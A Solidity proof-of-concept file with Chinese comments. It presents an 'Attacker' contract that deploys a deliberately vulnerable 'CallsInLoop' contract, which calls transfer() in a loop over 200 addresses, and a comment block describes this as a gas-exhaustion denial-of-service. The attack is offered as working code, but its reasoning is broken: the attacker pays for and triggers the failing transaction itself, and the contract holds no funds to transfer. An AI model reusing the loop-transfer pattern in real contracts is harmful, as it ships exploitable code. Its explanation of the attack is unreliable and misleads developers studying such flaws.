// 攻擊者合約
contract Attacker {
    // 目標是利用迴圈中的 transfer 功能來耗盡目標合約的 gas
    address private callsInLoopContract;
    address[] private largeAddressArray;
    
    constructor(address _callsInLoopContract) {
        callsInLoopContract = _callsInLoopContract;
        
        // 建立一個非常大的地址陣列，會讓目標合約的迴圈處理變得耗時且昂貴
        for (uint i = 0; i < 200; i++) {
            // 這裡可以放入任意有效地址，目的是建立大量的交易項目
            largeAddressArray.push(address(uint160(i + 1)));
        }
    }
    
    // 部署惡意合約的步驟：
    // 1. 部署此攻擊者合約，傳入目標 CallsInLoop 合約地址
    // 2. 呼叫 deployMaliciousContract() 函數來部署包含大量地址的 CallsInLoop 合約
    function deployMaliciousContract() public {
        // 部署一個新的 CallsInLoop 合約，並提供大量地址
        CallsInLoop newContract = new CallsInLoop(largeAddressArray);
        
        // 呼叫 bad() 函數，這將觸發大量的 transfer 操作，導致整個交易耗盡 gas 並失敗
        // 使用者將損失所有已支付的 gas
        newContract.bad();
    }
}

// 為了說明攻擊的目標合約
contract CallsInLoop {
    address[] public destinations;
    
    constructor(address[] memory newDestinations) {
        destinations = newDestinations;
    }
    
    function bad() external {
        for (uint i = 0; i < destinations.length; i++) {
            // 在迴圈中進行 transfer 操作，每次操作都可能失敗，且會消耗大量 gas
            payable(destinations[i]).transfer(i);
        }
    }
}

/*
攻擊說明：
1. 此攻擊利用了「迴圈中的異常處理」問題，通過建立大量的交易項目來耗盡 gas
2. 當 CallsInLoop 合約的 bad() 函數執行時，它會嘗試在迴圈中處理大量的 transfer 操作
3. 如果其中任何一個 transfer 操作失敗（例如：接收地址是合約但沒有 fallback 函數），
   整個交易會失敗，但用戶已經支付的 gas 費用將不會被退回
4. 攻擊者可以通過提供大量的地址來增加交易失敗的可能性，同時增加用戶的 gas 成本損失
5. 即使交易最終失敗，前面已經執行的操作也將被回滾，造成了 gas 的浪費和資源的無效消耗
*/